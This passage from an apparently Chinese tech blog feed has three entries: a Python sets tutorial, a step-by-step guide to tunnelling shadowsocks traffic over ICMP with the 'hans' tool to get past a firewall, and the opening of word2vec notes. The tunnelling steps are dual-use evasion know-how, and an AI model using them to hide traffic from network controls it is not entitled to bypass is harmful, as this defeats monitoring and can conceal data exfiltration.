    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>集合是无序的容器数据类型，它是无索引的，可变的并且没有重复的元素。 集合用大括号创建。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3><span id="chuang-jian-ji-he">创建集合</span></h3><p>使用花括号或内置的 <code>set</code> 函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用 set 函数从可迭代对象创建，比如列表，元组，字符串</span></span><br><span class="line">my_set_2 = <span class="built_in">set</span>([<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>])</span><br><span class="line">my_set_2 = <span class="built_in">set</span>((<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(my_set_2)</span><br><span class="line"></span><br><span class="line">my_set_3 = <span class="built_in">set</span>(<span class="string">&quot;aaabbbcccdddeeeeeffff&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set_3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：一个空的元组不能使用 &#123;&#125; 创建，这个会识别为字典</span></span><br><span class="line"><span class="comment"># 使用 set() 进行创建</span></span><br><span class="line">a = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br><span class="line">a = <span class="built_in">set</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;three&#x27;</span>, <span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;a&#x27;</span>&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-yuan-su">添加元素</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 add() 方法添加元素</span></span><br><span class="line">my_set.add(<span class="number">42</span>)</span><br><span class="line">my_set.add(<span class="literal">True</span>)</span><br><span class="line">my_set.add(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：顺序不重要，只会影响打印输出</span></span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 元素已经存在是没有影响</span></span><br><span class="line">my_set.add(<span class="number">42</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="literal">True</span>, <span class="number">42</span>, <span class="string">&#x27;Hello&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="literal">True</span>, <span class="number">42</span>, <span class="string">&#x27;Hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="yi-chu-yuan-su">移除元素</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># remove(x): 移除 x, 如果元素不存在则引发 KeyError 错误</span></span><br><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line">my_set.remove(<span class="string">&quot;apple&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># KeyError:</span></span><br><span class="line"><span class="comment"># my_set.remove(&quot;orange&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># discard(x): 移除 x, 如果元素不存在则什么也不做</span></span><br><span class="line">my_set.discard(<span class="string">&quot;cherry&quot;</span>)</span><br><span class="line">my_set.discard(<span class="string">&quot;blueberry&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() : 移除所有元素</span></span><br><span class="line">my_set.clear()</span><br><span class="line"><span class="built_in">print</span>(my_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() : 移除并返回随机一个元素</span></span><br><span class="line">a = &#123;<span class="literal">True</span>, <span class="number">2</span>, <span class="literal">False</span>, <span class="string">&quot;hi&quot;</span>, <span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(a.pop())</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;banana&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">set</span>()</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&#123;<span class="literal">True</span>, <span class="number">2</span>, <span class="string">&#x27;hi&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-yuan-su-shi-fou-cun-zai">检查元素是否存在</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;apple&quot;</span> <span class="keyword">in</span> my_set:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="die-dai">迭代</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 for 循环迭代集合</span></span><br><span class="line"><span class="comment"># 注意：顺序不重要</span></span><br><span class="line">my_set = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> my_set:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banana</span><br><span class="line">apple</span><br><span class="line">cherry</span><br></pre></td></tr></table></figure><h3><span id="bing-ji-he-jiao-ji">并集和交集</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">odds = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;</span><br><span class="line">evens = &#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>&#125;</span><br><span class="line">primes = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># union() : 合并来自两个集合的元素，不重复</span></span><br><span class="line"><span class="comment"># 注意这不会改变两个集合</span></span><br><span class="line">u = odds.union(evens)</span><br><span class="line"><span class="built_in">print</span>(u)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection(): 选择在两个集合中都存在的元素</span></span><br><span class="line">i = odds.intersection(evens)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">i = odds.intersection(primes)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">i = evens.intersection(primes)</span><br><span class="line"><span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line"><span class="built_in">set</span>()</span><br><span class="line">&#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="ji-he-de-chai">集合的差</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setB = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference() : 返回集合 setA 中不在集合 setB 中的元素的集合</span></span><br><span class="line">diff_set = setA.difference(setB)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A.difference(B) 与 B.difference(A) 不一样</span></span><br><span class="line">diff_set = setB.difference(setA)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># symmetric_difference() : 返回集合 setA 和 setB 中不同时在两个集合中的元素的集合</span></span><br><span class="line">diff_set = setA.symmetric_difference(setB)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A.symmetric_difference(B) = B.symmetric_difference(A)</span></span><br><span class="line">diff_set = setB.symmetric_difference(setA)</span><br><span class="line"><span class="built_in">print</span>(diff_set)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">&#123;<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="geng-xin-ji-he">更新集合</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setB = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() : 通过添加其他集合的元素进行更新</span></span><br><span class="line">setA.update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection_update() : 通过保留共同的元素进行更新</span></span><br><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setA.intersection_update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference_update() : 通过移除与其他集合中相同的元素进行更新</span></span><br><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setA.difference_update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># symmetric_difference_update() : 通过保留只出现在一个集合而不出现在另一个集合中的元素进行更新</span></span><br><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">setA.symmetric_difference_update(setB)</span><br><span class="line"><span class="built_in">print</span>(setA)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：所有的更新方法同时适用于其他可迭代对象作为参数，比如列表，元组</span></span><br><span class="line"><span class="comment"># setA.update([1, 2, 3, 4, 5, 6])</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line">&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="fu-zhi">复制</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set_org = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只是引用的复制，需要注意</span></span><br><span class="line">set_copy = set_org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改复制集合也会影响原来的集合</span></span><br><span class="line">set_copy.update([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="built_in">print</span>(set_copy)</span><br><span class="line"><span class="built_in">print</span>(set_org)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 copy() 真正复制集合</span></span><br><span class="line">set_org = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">set_copy = set_org.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在修改复制集合不会影响原来的集合</span></span><br><span class="line">set_copy.update([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>])</span><br><span class="line"><span class="built_in">print</span>(set_copy)</span><br><span class="line"><span class="built_in">print</span>(set_org)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure><h3><span id="zi-ji-chao-ji-he-bu-jiao-ji">子集，超集和不交集</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setA = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">setB = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="comment"># issubset(setX): 如果 setX 包含集合，返回 True</span></span><br><span class="line"><span class="built_in">print</span>(setA.issubset(setB))</span><br><span class="line"><span class="built_in">print</span>(setB.issubset(setA)) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># issuperset(setX): 如果集合包含 setX，返回 True</span></span><br><span class="line"><span class="built_in">print</span>(setA.issuperset(setB)) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(setB.issuperset(setA))</span><br><span class="line"></span><br><span class="line"><span class="comment"># isdisjoint(setX) : 如果两个集合交集为空，比如没有相同的元素，返回 True</span></span><br><span class="line">setC = &#123;<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(setA.isdisjoint(setB))</span><br><span class="line"><span class="built_in">print</span>(setA.isdisjoint(setC))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h3><span id="frozenset">Frozenset</span></h3><p>Frozenset 只是普通集和的不变版本。 尽管可以随时修改集合的元素，但 Frozenset 的元素在创建后保持不变。 创建方式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_frozenset = <span class="built_in">frozenset</span>(iterable)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">frozenset</span>([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下操作不允许：</span></span><br><span class="line"><span class="comment"># a.add(5)</span></span><br><span class="line"><span class="comment"># a.remove(1)</span></span><br><span class="line"><span class="comment"># a.discard(1)</span></span><br><span class="line"><span class="comment"># a.clear()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时，更新方法也不允许：</span></span><br><span class="line"><span class="comment"># a.update([1,2,3])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他集合操作可行</span></span><br><span class="line">odds = <span class="built_in">frozenset</span>(&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;)</span><br><span class="line">evens = <span class="built_in">frozenset</span>(&#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(odds.union(evens))</span><br><span class="line"><span class="built_in">print</span>(odds.intersection(evens))</span><br><span class="line"><span class="built_in">print</span>(odds.difference(evens))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">frozenset</span>(&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;)</span><br><span class="line"><span class="built_in">frozenset</span>()</span><br><span class="line"><span class="built_in">frozenset</span>(&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      04. 集合 — Python 进阶
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>在 Mac OS X 上使用 hans 配置 ICMP 隧道</title>
    <link href="https://qiwihui.com/qiwihui-blog-52/"/>
    <id>https://qiwihui.com/qiwihui-blog-52/</id>
    <published>2022-08-13T01:54:25.490Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为电信白名单，高端口基本无法使用，解决办法就是将翻墙服务启动在80，443等可访问端口。但是最近防火墙又一次升级，国外的服务器基本只能 ping 通，TCP 请求无法完成，能访问世界的方式越来越困难。本文介绍一种方法，将数据包封装在 ping 包中进行传输。本方法中使用 <a href="http://code.gerade.org/hans/">hans</a> 这个项目结合 shadowsocks-libev 翻墙。</p><span id="more"></span><h2><span id="an-zhuang">安装</span></h2><h3><span id="fu-wu-qi-duan">服务器端</span></h3><p>同样，需要在服务器端编译安装 <code>hans</code>：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -c https://github.com/friedrich/hans/archive/v1.0.tar.gz</span><br><span class="line">tar zxvf v1.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> hans-1.0/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译完成后会产生 <code>hans</code> 执行程序，按以下命令以 <code>root</code> 启动，程序会进入 Deamon 模式。如果要看到输出，可以加上 <code>-f</code> 参数。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hans -s 10.1.2.0 -p password</span><br></pre></td></tr></table></figure><p>其中，<code>password</code> 为设置的密码。然后使用 <code>netstat -rn</code> 可以看到多了一个 <code>tun0</code> 设备</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -rn</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">(省略其他的)</span><br><span class="line">10.1.2.0        0.0.0.0         255.255.255.0   U         0 0          0 tun0</span><br></pre></td></tr></table></figure><h3><span id="ke-hu-duan">客户端</span></h3><p>在 Mac OS X 上，先安装 <code>tuntap</code> 内核扩展来允许创建虚拟网卡，可以直接使用 Homebrew-Cask 安装，安装过程中需要按照指示给程序权限。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew cask install tuntap</span><br></pre></td></tr></table></figure><p>下载 Mac 版本程序并解压：<a href="https://sourceforge.net/projects/hanstunnel/files/osx/">hans</a></p><p>运行程序：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./hans -c &lt;server-ip&gt; -p password -d tun0</span><br></pre></td></tr></table></figure><p>其中 <code>server-ip</code> 是你服务器的 IP，<code>-d</code> 指定Mac上新启设备的名称。Mac 上停止 <code>hans</code> 程序请使用 <code>kill -9</code>。如果启动正常，这时在Mac上也同样可以观察到tun0设备：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ifconfig</span><br><span class="line"></span><br><span class="line">(省略其他)</span><br><span class="line">tun0: flags=8851&lt;UP,POINTOPOINT,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1467</span><br><span class="line">        inet 10.1.2.100 --&gt; 10.1.2.1 netmask 0xffffffff </span><br><span class="line">        open (pid 74236)</span><br></pre></td></tr></table></figure><p>理论上这时服务器 IP 是无法 ping 通了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ping &lt;server-ip&gt;</span><br><span class="line">PING &lt;server-ip&gt;: 56 data bytes</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 0</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 1</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 2</span><br><span class="line">Request <span class="built_in">timeout</span> <span class="keyword">for</span> icmp_seq 3</span><br><span class="line">^C</span><br><span class="line">--- &lt;server-ip&gt; ping statistics ---</span><br><span class="line">5 packets transmitted, 0 packets received, 100.0% packet loss</span><br></pre></td></tr></table></figure><p>此时，就建立了一条从本地到服务器的 hanstunnel tunnel 了。</p><p>现在只需要将本地 <code>ss-local</code> 的配置中的 <code>server</code> 参数改为 <code>tun0</code> 的 gateway 地址（本例为<code>10.1.2.1</code>）即可，其他不需要做任何修改。</p><h3><span id="jian-cha-liu-liang">检查流量</span></h3><p>在服务器网卡上抓包可以不断看到 ICMP 的 ｀echo request｀ 和 ｀echo reply｀ 包，在 <code>tun0</code> 上可以看到实际的数据包。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tcpdump -ni ens3</span><br><span class="line"></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens3, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">02:16:29.146644 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 93</span><br><span class="line">02:16:29.146647 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 13</span><br><span class="line">02:16:29.146652 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 13</span><br><span class="line">02:16:29.146684 IP &lt;local-ip&gt; &gt; &lt;server-ip&gt;: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 93</span><br><span class="line">02:16:29.146704 IP &lt;server-ip&gt; &gt; &lt;local-ip&gt;: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 257</span><br><span class="line">02:16:29.146858 IP &lt;server-ip&gt; &gt; &lt;local-ip&gt;: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 833</span><br><span class="line">02:16:29.146942 IP &lt;server-ip&gt; &gt; &lt;local-ip&gt;: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 38174, <span class="built_in">seq</span> 7330, length 257</span><br><span class="line"></span><br><span class="line">(略去一堆)</span><br></pre></td></tr></table></figure><p>以上就是使用 TCP over ICMP 的方法进行数据传输的配置过程。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      在 Mac OS X 上使用 hans 配置 ICMP 隧道
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>word2vec理解思路</title>
    <link href="https://qiwihui.com/qiwihui-blog-66/"/>
    <id>https://qiwihui.com/qiwihui-blog-66/</id>
    <published>2022-08-13T01:54:25.480Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>本文归纳整理了一些论文和博客对word2vec的理解，以期理解word2vec。</p><h2><span id="gai-shu">概述</span></h2><h3><span id="yu-yan-biao-shi-ci-xiang-liang">语言表示：词向量</span></h3><ol><li><p>词的独热表示（One-Hot Representation）</p><p>缺点：</p><ul><li>容易受维数灾难的困扰；</li><li>不能很好地刻画词与词之间的相似性，任意两个词之间都是孤立的；</li></ul></li><li><p>词的分布式表示（Distributed Representation）</p><ol><li>基于矩阵的分布表示：比如，GloVe模型；</li><li>基于聚类的分布表示；</li><li>基于神经网络的分布表示，词嵌入；</li></ol></li></ol><span id="more"></span><h3><span id="yu-yan-mo-xing">语言模型</span></h3><p>文法语言模型，统计语言模型</p><p>核心是上下文的表示以及上下文与目标词之间的关系的建模。</p><p>语言模型就是计算一个句子的概率大小的模型。一个句子的打分概率越高，越说明他是更合乎人说出来的自然句子。常见的统计语言模型有N元文法模型（N-gram Model），最常见的是unigram model、bigram model、trigram model等等。还有N-pos模型。</p><h3><span id="ci-qian-ru">词嵌入</span></h3><p>2001年，Bengio 等人正式提出神经网络语言模型（ Neural Network Language Model ，NNLM），该模型在学习语言模型的同时，也得到了词向量。所以请注意：<strong>词向量可以认为是神经网络训练语言模型的副产品</strong>。</p><p>做法：</p><p>1、将one-hot中的vector每一个元素由整形改为浮点型，变为整个实数范围的表示；2、将原来稀疏的巨大维度压缩 <strong>嵌入</strong> 到一个更小维度的空间。</p><h3><span id="shen-jing-wang-luo-yu-yan-mo-xing-yu-word2vec">神经网络语言模型与word2vec</span></h3><h4><span id="shen-jing-wang-luo-yu-yan-mo-xing">神经网络语言模型：</span></h4><p>a. Neural Network Language Model ，NNLMb. 